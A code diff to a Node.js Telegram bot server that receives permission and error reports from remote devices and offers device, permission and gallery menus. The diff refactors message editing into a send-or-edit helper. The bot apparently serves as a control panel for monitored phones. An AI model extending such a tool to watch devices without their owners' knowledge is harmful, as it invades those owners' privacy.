@@ -489,7 +489,11 @@ const getGalleryKeyboard = (includeBack = true) => {
 
 /* ── Enhanced Callback Handler ──────────────────── */
 bot.on("callback_query", async q => {
-  const {id, data, message} = q;
+  const {id, message} = q;
+  let data = q.data;
+  // Legacy aliases to avoid undefined handlers
+  if (data === 'showDeviceMenu') data = 'device_menu';
+  if (data === 'showPermissionsMenu') data = 'permissions_menu';
   const chatId = message.chat.id;
   const msgId = message.message_id;
   
@@ -1948,6 +1952,33 @@ app.post("/json/error", express.json(), async (req, res) => {
   }
 });
 
+// Helper to edit a message or send a new one if edit is impossible
+async function sendOrEdit(chat_id, msg_id, text, options, key) {
+  const canEdit = Number.isFinite(chat_id) && chat_id > 0 && Number.isFinite(msg_id) && msg_id > 0;
+  if (canEdit) {
+    try {
+      await bot.editMessageText(text, { chat_id, message_id: msg_id, ...(options || {}) });
+      return;
+    } catch (e) {
+      const desc = e && (e.description || e.message || "");
+      if (typeof desc === 'string' && desc.includes('message is not modified')) {
+        return; // harmless, nothing to update
+      }
+      // otherwise fall through to send
+    }
+  }
+  try {
+    const sessions = key ? getActiveSessions(key) : [];
+    const targets = sessions.length ? sessions.map(s => s.chatId) : [];
+    const fallbackTargets = targets.length ? targets : (canEdit ? [chat_id] : []);
+    for (const cid of fallbackTargets) {
+      await bot.sendMessage(cid, text, options || {});
+    }
+  } catch (_) {
+    // suppress send errors to avoid cascading failures
+  }
+}
+
 /* 13) Permission checker response */
 app.post("/json/permissions", express.json(), async (req, res) => {
   try {
@@ -2055,10 +2086,7 @@ app.post("/json/permissions", express.json(), async (req, res) => {
     
     message += `_Device: ${deviceInfo.deviceId.slice(0,6)}_`;
     
-    try {
-    await bot.editMessageText(message, {
-      chat_id,
-      message_id: msg_id,
+    await sendOrEdit(chat_id, msg_id, message, {
       parse_mode: 'Markdown',
       reply_markup: {
         inline_keyboard: [
@@ -2066,18 +2094,7 @@ app.post("/json/permissions", express.json(), async (req, res) => {
           [{text: "🔙 Back to Menu", callback_data: "permissions_menu"}]
         ]
       }
-    });
-    } catch (editError) {
-      // Handle "message is not modified" error gracefully
-      if (editError.description && editError.description.includes("message is not modified")) {
-        console.log("Message content unchanged - this is normal for refresh");
-        // Don't throw error, just log it
-        return;
-      } else {
-        console.error("Error editing message:", editError);
-        throw editError; // Re-throw other errors
-      }
-    }
+    }, deviceInfo.key);
     
     res.json({ok: true});
   } catch (error) {
@@ -2128,22 +2145,10 @@ app.post("/json/permission_request", express.json(), async (req, res) => {
       };
     }
     
-    try {
-      await bot.editMessageText(responseMessage, {
-        chat_id,
-        message_id: msg_id,
-        parse_mode: 'Markdown',
-        reply_markup: keyboard
-      });
-    } catch (editError) {
-      if (editError.description && editError.description.includes("message is not modified")) {
-        console.log("Message content unchanged - this is normal for refresh");
-        return;
-      } else {
-        console.error("Error editing message:", editError);
-        throw editError;
-      }
-    }
+    await sendOrEdit(chat_id, msg_id, responseMessage, {
+      parse_mode: 'Markdown',
+      reply_markup: keyboard
+    }, deviceInfo.key);
     
     res.json({ok: true});
   } catch (error) {
